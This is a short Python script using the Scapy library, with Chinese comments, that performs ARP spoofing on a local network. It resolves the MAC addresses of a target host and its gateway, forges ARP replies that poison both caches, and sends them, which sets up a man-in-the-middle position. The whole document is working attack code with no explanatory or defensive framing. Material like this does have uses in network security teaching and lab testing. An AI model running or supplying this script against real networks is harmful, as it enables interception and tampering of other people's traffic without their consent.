from scapy.all import *
# 目標 IP 和欺騙的 IP
target_ip = "192.168.2.100"
gateway_ip = "192.168.2.1"
# 獲取目標和網關的 MAC 地址
target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)
# 建構 ARP 欺騙封包
arp_response_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
arp_response_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
# 發送 ARP 欺騙包
send(arp_response_to_target)
send(arp_response_to_gateway)
